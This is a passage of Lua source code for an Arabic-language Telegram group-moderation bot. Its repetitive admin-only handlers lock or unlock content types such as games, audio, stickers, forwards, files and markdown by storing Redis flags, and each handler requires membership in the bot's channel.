return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:geam"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الالعاب").Lock,"md",true)  
return false
end 
if text == "قفل الالعاب بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:geam"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الالعاب").lockKid,"md",true)  
return false
end 
if text == "قفل الالعاب بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:geam"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الالعاب").lockKtm,"md",true)  
return false
end 
if text == "قفل الالعاب بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:geam"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الالعاب").lockKick,"md",true)  
return false
end 
if text == "فتح الالعاب" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:geam"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح الالعاب").unLock,"md",true)  
return false
end 
if text == "قفل الاغاني" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Audio"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الاغاني").Lock,"md",true)  
return false
end 
if text == "قفل الاغاني بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Audio"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الاغاني").lockKid,"md",true)  
return false
end 
if text == "قفل الاغاني بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Audio"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الاغاني").lockKtm,"md",true)  
return false
end 
if text == "قفل الاغاني بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Audio"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الاغاني").lockKick,"md",true)  
return false
end 
if text == "فتح الاغاني" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:Audio"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح الاغاني").unLock,"md",true)  
return false
end 
if text == "قفل الصوت" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:vico"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الصوت").Lock,"md",true)  
return false
end 
if text == "قفل الصوت بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:vico"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الصوت").lockKid,"md",true)  
return false
end 
if text == "قفل الصوت بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:vico"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الصوت").lockKtm,"md",true)  
return false
end 
if text == "قفل الصوت بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:vico"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الصوت").lockKick,"md",true)  
return false
end 
if text == "فتح الصوت" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:vico"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح الصوت").unLock,"md",true)  
return false
end 
if text == "قفل الكيبورد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Keyboard"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الكيبورد").Lock,"md",true)  
return false
end 
if text == "قفل الكيبورد بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Keyboard"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الكيبورد").lockKid,"md",true)  
return false
end 
if text == "قفل الكيبورد بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Keyboard"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الكيبورد").lockKtm,"md",true)  
return false
end 
if text == "قفل الكيبورد بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Keyboard"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الكيبورد").lockKick,"md",true)  
return false
end 
if text == "فتح الكيبورد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:Keyboard"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح الكيبورد").unLock,"md",true)  
return false
end 
if text == "قفل الملصقات" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Sticker"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الملصقات").Lock,"md",true)  
return false
end 
if text == "قفل الملصقات بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Sticker"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الملصقات").lockKid,"md",true)  
return false
end 
if text == "قفل الملصقات بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Sticker"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الملصقات").lockKtm,"md",true)  
return false
end 
if text == "قفل الملصقات بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Sticker"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الملصقات").lockKick,"md",true)  
return false
end 
if text == "فتح الملصقات" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:Sticker"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح الملصقات").unLock,"md",true)  
return false
end 
if text == "قفل التوجيه" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:forward"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل التوجيه").Lock,"md",true)  
return false
end 
if text == "قفل التوجيه بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:forward"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل التوجيه").lockKid,"md",true)  
return false
end 
if text == "قفل التوجيه بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:forward"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل التوجيه").lockKtm,"md",true)  
return false
end 
if text == "قفل التوجيه بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:forward"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل التوجيه").lockKick,"md",true)  
return false
end 
if text == "فتح التوجيه" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:forward"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح التوجيه").unLock,"md",true)  
return false
end 
if text == "قفل الملفات" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Document"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الملفات").Lock,"md",true)  
return false
end 
if text == "قفل الملفات بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Document"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الملفات").lockKid,"md",true)  
return false
end 
if text == "قفل الملفات بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Document"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الملفات").lockKtm,"md",true)  
return false
end 
if text == "قفل الملفات بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Document"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الملفات").lockKick,"md",true)  
return false
end 
if text == "فتح الملفات" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:Document"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح الملفات").unLock,"md",true)  
return false
end 
if text == "قفل السيلفي" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Unsupported"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل السيلفي").Lock,"md",true)  
return false
end 
if text == "قفل السيلفي بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Unsupported"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل السيلفي").lockKid,"md",true)  
return false
end 
if text == "قفل السيلفي بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Unsupported"..msg_chat_id,"ktm")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل السيلفي").lockKtm,"md",true)  
return false
end 
if text == "قفل السيلفي بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Unsupported"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل السيلفي").lockKick,"md",true)  
return false
end 
if text == "فتح السيلفي" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Lock:Unsupported"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح السيلفي").unLock,"md",true)  
return false
end 
if text == "قفل الماركداون" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Markdaun"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الماركداون").Lock,"md",true)  
return false
end 
if text == "قفل الماركداون بالتقييد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:Markdaun"..msg_chat_id,"ked")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الماركداون").lockKid,"md",true)  
return false
end 
if text == "قفل الماركداون بالكتم" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
